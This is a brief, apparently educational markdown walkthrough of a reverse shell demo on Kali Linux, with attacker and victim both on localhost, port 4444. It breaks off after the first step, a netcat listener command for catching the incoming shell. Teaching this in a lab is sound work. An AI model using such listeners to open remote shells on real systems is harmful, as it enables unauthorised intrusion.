
# Practical Demo – Reverse Shell on Kali Linux

## 🔧 Setup
- **Attacker Machine**: Kali Linux (localhost)
- **Victim Machine**: Same Kali Linux (safe and ethical)
- **IP Used**: `127.0.0.1`
- **Port**: `4444`

## 📋 Step-by-Step Execution

### Step 1: Start Listener (Attacker)
- Open **Terminal 1**
- Run the following command:
  ```bash
  nc -nvlp 4444

